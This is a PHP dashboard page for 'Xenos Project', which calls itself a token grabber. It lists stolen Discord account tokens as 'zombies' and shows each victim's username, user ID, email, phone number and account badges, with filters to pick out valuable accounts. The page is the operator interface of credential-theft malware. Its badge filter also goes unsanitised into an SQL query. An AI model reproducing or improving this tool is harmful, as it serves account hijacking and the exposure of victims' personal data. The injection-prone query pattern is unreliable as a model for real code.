<?php

    require_once('Inc/fonctions.php');

    if(!CheckLogin()){
        header('Location: login');
    }


    $title = "Tokens";
    require('Inc/Dash.php');

?>

    <!-- Main -->
    <section class="section_main">
        <div class="main">
            <img src="assets/images/xenos.gif" alt="">
            <h1>Xenos Project</h1>
            <p>The Best Most powerfull token grabber with user interface.</p>
        </div>
    </section>

    <section class="section_zombies">
        <div class="filtre">
            <select onchange="SearchByGrade(this)" id="search_by_badges" name="search_by_badges" class="select-button">
                <option value="None">Default</option>    
                <option value="all">All</option>
                <option value="256">Balance</option>
                <option value="64">Bravery</option>
                <option value="128">Brillance</option>
                <option value="8">BugHunter</option>
                <option value="131072">Dev</option>
                <option value="512">Early</option>
                <option value="4">HypeSquad</option>
                <option value="2">Partner</option>
                <option value="1">Staff</option>
                <!-- <option value="verified">Verified</option> -->
                <option value="1338">Nitro Boost</option>
                <option value="1337">Nitro Classic</option>
                <option value="FLAGED">Flaged</option>
                <option value="NOFLAGED">Not Flaged</option>
            </select>
            <!-- <input type="text" placeholder="Search Username..." class="select-input" id="user_search"> -->
            <!-- <button class="select-button search-btn" onclick="SearchByUsername()"><i class='bx bx-search-alt-2'></i></button> -->
        </div>
        <div id="zombies" class="zombies">
            <?php
                global $bdd;

                if(isset($_GET['badge']) && !empty($_GET['badge'])) {
                    $badge = htmlspecialchars($_GET['badge']);
                    if($badge != "None") {
                        if($badge == "all") {
                            $resp = $bdd->query('SELECT * FROM tokens');
                        } else if ($badge == "1337") {
                            $resp = $bdd->query('SELECT * FROM tokens WHERE nitro_badges = 1');
                        } else if ($badge == "1338") {
                            $resp = $bdd->query('SELECT * FROM tokens WHERE nitro_badges = 2');
                        } else if ($badge == "FLAGED") {
                            $resp = $bdd->query('SELECT * FROM tokens WHERE isflaged = 1');
                        } else if ($badge == "NOFLAGED") {
                            $resp = $bdd->query('SELECT * FROM tokens WHERE isflaged = 0');
                        } else {
                            $resp = $bdd->query('SELECT * FROM tokens WHERE badges = ' . $badge);
                        }
                    }                    
                } else {
                    $resp = $bdd->query('SELECT * FROM tokens');
                }
                
                while ($user = $resp->fetch()) {
            ?>
                <div class="zombie flaged-<?=strval($user["isflaged"]);?>">
                    <?php
                        if(!empty($user['avatar']) AND $user['avatar'] != null){
                            ?><img class="user_pfp" src="https://cdn.discordapp.com/avatars/<?=$user['user_id']?>/<?=$user['avatar']?>" alt="" srcset=""><?php
                        } else {
                            ?><img class="user_pfp" src="assets/images/Default.png" alt="" srcset=""><?php
                        }
                    ?>
                    <span><?=$user['username']?> (<?=$user['user_id']?>)</span>
                    <p><?=$user['email']?></p>
                    <p><?=$user['phone']?></p>
                    <div class="badges">
                        <?php
                            if($user['badges'] == 1) {
                                echo '<img src="assets/badges/Staff.png" alt="" srcset="">';
                            }else if($user['badges'] == 2) {
                                echo '<img src="assets/badges/Partner.png" alt="" srcset="">';
                            }else if($user['badges'] == 4) {
                                echo '<img src="assets/badges/hypeSquad.png" alt="" srcset="">';
                            }else if($user['badges'] == 8) {
                                echo '<img src="assets/badges/BugHunter.png" alt="" srcset="">';
                            }else if($user['badges'] == 64) {
                                echo '<img src="assets/badges/Bravery.png" alt="" srcset="">';
                            }else if($user['badges'] == 128) {
                                echo '<img src="assets/badges/Brilliance.png" alt="" srcset="">';
                            }else if($user['badges'] == 256) {
                                echo '<img src="assets/badges/Balance.png" alt="" srcset="">';
                            }else if($user['badges'] == 512) {
                                echo '<img src="assets/badges/early.png" alt="" srcset="">';
                            }else if($user['badges'] == 131072) {
                                echo '<img src="assets/badges/dev.png" alt="" srcset="">';
                            }

                            if($user['nitro_badges'] == 1) {
                                echo '<img src="assets/badges/Nitro_cl.png" alt="" srcset="">';
                            }else if($user['nitro_badges'] == 2) {
                                echo '<img src="assets/badges/Nitro_cl.png" alt="" srcset="">';
                                echo '<img src="assets/badges/Nitro_Boost.png" alt="" srcset="">';
                            }
                        ?>
                    </div>
                    <a class="edit_token" href="token?id=<?=$user['user_id']?>">View All Infos</a>
                </div>

            <?php
                }
            ?>
        </div>
    </section>

    <footer>
        Copyright ©️ Made By <a target="_blank" href="https://github.com/KanekiWeb">Kaneki Web</a>
    </footer>

    <script src="assets/js/filter.js"></script>

</body>
</html>